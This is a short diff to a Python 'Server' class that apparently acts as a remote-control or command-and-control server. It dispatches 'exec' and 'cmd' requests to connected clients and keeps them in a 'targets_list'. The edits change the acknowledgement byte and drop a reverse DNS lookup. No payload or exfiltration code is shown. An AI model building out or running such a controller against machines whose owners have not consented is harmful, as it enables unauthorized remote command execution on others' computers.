@@ -54,12 +54,12 @@ class Server:
 			elif content_splited[0] == "exec" and len(content_splited) > 2:
 				cut = len(content_splited[0])+len(content_splited[1])+2
 				self.exec_on_client(content_splited[1], content[cut:])
-				conn.send(bytes("0", "utf-8"))
+				conn.send(bytes(" ", "utf-8"))
 			
 			elif content_splited[0] == "cmd" and len(content_splited) > 2:
 				cut = len(content_splited[0])+len(content_splited[1])+2
 				self.cmd_on_client(conn, content_splited[1], content[cut:])
-				conn.send(bytes("0", "utf-8"))
+				conn.send(bytes(" ", "utf-8"))
 
 			else:
 				conn.send(bytes(f"unknow command: {command.decode()}", "utf-8"))
@@ -75,7 +75,7 @@ class Server:
 					break
 				else:
 					conn.send(b'0')
-					self.targets_list[addr[0]] = [conn, datetime.now(timezone.utc).strftime("%d.%m.%Y/%H.%M.%S"), socket.gethostbyaddr(addr[0])]
+					self.targets_list[addr[0]] = [conn, datetime.now(timezone.utc).strftime("%d.%m.%Y/%H.%M.%S")]
 
 			except:
 				print(f"{addr[0]}:{addr[1]}", "was disconnected")
